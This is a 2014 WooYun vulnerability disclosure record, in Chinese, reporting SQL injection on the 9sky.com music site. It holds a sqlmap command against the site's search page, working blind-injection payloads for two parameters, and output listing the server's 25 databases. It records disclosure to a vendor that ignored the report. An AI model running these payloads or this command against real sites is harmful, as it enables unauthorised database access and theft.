{"id": 53135, "wybug_id": "wooyun-2014-068686", "wybug_title": "9天音乐网SQL注入一枚", "wybug_corp": "九天音乐网", "wybug_author": "Lonely", "wybug_date": "2014-07-16 10:32", "wybug_open_date": "2014-08-30 10:34", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "未联系到厂商或者厂商积极忽略", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-07-16：\t积极联系厂商并且等待厂商认领中，细节不对外公开\t\t\t\t\t\t\t\t\t2014-08-30：\t厂商已经主动忽略漏洞，细节向公众公开  简要描述： RT 详细说明：  C:\\Python27\\sqlmap>sqlmap.py -u \"http://www.9sky.com/12530/searchring.aspx?artName=%7B1%7D&musicname=%7B0%7D\" --dbs    sqlmap/1.0-dev - automatic SQL injection and database takeover tool    http://sqlmap.org[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicablelocal, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program[*] starting at 01:32:22[01:32:22] [WARNING] using 'C:\\Documents and Settings\\Administrator\\.sqlmap\\output' as the output directory[01:32:22] [INFO] resuming back-end DBMS 'microsoft sql server'[01:32:22] [INFO] testing connection to the target URLsqlmap got a 302 redirect to 'http://www.9sky.com:80/12530/default.aspx'. Do you want to follow? [Y/n] ysqlmap identified the following injection points with a total of 0 HTTP(s) requests:---Place: GETParameter: artName    Type: boolean-based blind    Title: Microsoft SQL Server/Sybase stacked conditional-error blind queries    Payload: artName={1}'; IF(6584=6584) SELECT 6584 ELSE DROP FUNCTION EXFh--&musicname={0}    Type: AND/OR time-based blind    Title: Microsoft SQL Server/Sybase AND time-based blind (heavy query - comment)    Payload: artName={1}' AND 9955=(SELECT COUNT(*) FROM sysusers AS sys1,sysusers AS sys2,sysusers AS sys3,sysusers AS sys4,sysusers AS sys5,sysusers AS sys6,sysusers AS sys7)--&musicname={0}Place: GETParameter: musicname    Type: boolean-based blind    Title: Microsoft SQL Server/Sybase stacked conditional-error blind queries    Payload: artName={1}&musicname={0}'; IF(3778=3778) SELECT 3778 ELSE DROP FUNCTION OavY--    Type: AND/OR time-based blind    Title: Microsoft SQL Server/Sybase AND time-based blind (heavy query - comment)    Payload: artName={1}&musicname={0}' AND 4238=(SELECT COUNT(*) FROM sysusersAS sys1,sysusers AS sys2,sysusers AS sys3,sysusers AS sys4,sysusers AS sys5,sysusers AS sys6,sysusers AS sys7)-----there were multiple injection points, please select the one to use for following injections:[0] place: GET, parameter: musicname, type: Single quoted string (default)[1] place: GET, parameter: artName, type: Single quoted string[q] Quit> 0[01:32:26] [INFO] the back-end DBMS is Microsoft SQL Serverweb server operating system: Windowsweb application technology: ASP.NET, Nginx, ASP.NET 2.0.50727back-end DBMS: Microsoft SQL Server 2005[01:32:26] [INFO] fetching database names[01:32:26] [INFO] fetching number of databases[01:32:26] [WARNING] running in a single-thread mode. Please consider usage of option '--threads' for faster data retrievalavailable databases [25]:[*] 9sky_Within[*] AMusic118100[*] Bank07[*] CRM[*] CTGateway[*] Data07[*] distribution[*] GroupRing[*] master[*] MDN07[*] model[*] msdb[*] Music07[*] Music_Delete[*] Music_Matching[*] Music_Ruyi[*] OA07[*] OA_Service[*] Play[*] Show[*] Soa07[*] SP06[*] SP_Soa[*] tempdb[*] ylbt[01:57:53] [WARNING] HTTP error codes detected during run:500 (Internal Server Error) - 760 times[01:57:53] [INFO] fetched data logged to text files under 'C:\\Documents and Settings\\Administrator\\.sqlmap\\output\\www.9sky.com'   漏洞证明：  \n\n   修复方案：     版权声明：转载请注明来源 Lonely@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 未能联系到厂商或者厂商积极拒绝  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}